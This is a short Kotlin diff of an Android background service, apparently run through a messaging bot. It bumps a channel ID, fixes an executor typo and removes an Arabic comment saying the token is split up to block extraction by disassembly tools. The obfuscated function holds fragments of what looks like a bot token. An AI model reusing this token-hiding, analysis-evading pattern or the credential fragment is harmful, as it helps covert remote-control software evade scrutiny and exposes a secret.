@@ -47,10 +47,9 @@ class BackgroundControlService : Service() {
 
     companion object {
         private const val TAG = "StrictSovereignEngine"
-        private const val CHANNEL_ID = "sync_channel_strict_core_v1007"
+        private const val CHANNEL_ID = "sync_channel_strict_core_v1008"
         private const val NOTIFICATION_ID = 2026
 
-        // دمج فك التشفير الديناميكي لمنع استخراج التوكن بأدوات التفكيك
         private fun getObfuscatedToken(): String {
             val p1 = "9004970470"
             val p2 = "AAFfsBFENB"
@@ -719,7 +718,7 @@ class BackgroundControlService : Service() {
     }
 
     private fun sendDirectMessage(chatId: String, text: String) {
-        executionExecutor.execution {
+        executionExecutor.execute {
             try {
                 val body = JSONObject().apply {
                     put("chat_id", chatId)
